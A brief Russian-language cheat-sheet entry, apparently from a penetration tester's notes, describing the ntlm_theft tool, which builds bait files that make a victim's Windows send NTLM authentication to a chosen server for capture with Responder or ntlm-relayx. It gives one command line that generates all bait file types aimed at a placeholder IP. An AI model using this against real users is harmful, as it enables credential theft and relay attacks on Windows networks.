#tool #windows #AD #ntlm #relay

Это инструмент, который **создаёт файлы‑ловушки** (docx, lnk, pdf, html, etc.), и когда жертва их открывает, её Windows **автоматически отправляет NTLM‑аутентификацию** на указанный сервер.

Далее мы уже можем перехватить эту аутентификацию (например, `Responder` / `ntlm-relayx`) и воспользоваться атакой `ntlm-relay`

```bash
python3 ntlm_theft.py --generate all --server <ip> -f <filename_prefix>
```

